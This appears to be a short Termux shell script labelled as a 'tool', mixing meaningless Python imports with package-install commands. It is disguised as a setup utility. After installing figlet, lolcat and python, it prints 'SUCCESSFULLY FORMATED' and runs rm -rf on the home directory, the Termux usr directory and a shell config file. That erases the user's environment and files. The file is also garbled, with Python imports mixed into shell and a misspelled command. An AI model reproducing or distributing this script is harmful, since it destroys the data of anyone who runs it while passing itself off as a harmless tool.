#TOOL by MR.THENUX

from ctypes import cdll
from platform import python_branch
from tkinter import Y
from turtle import clear

clear

termux-setup-storage
pkg install figlet -y
pkg install lolcat -y
pkg install python -y
pkg intall python2 -y

clear

echo
figlet -f small SUCCESSFULLY FORMATED | lolcat
figlet -f small TOOL BY MR.THENUX | lolcat

cd
cd ..
rm -rf home
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/zshrc
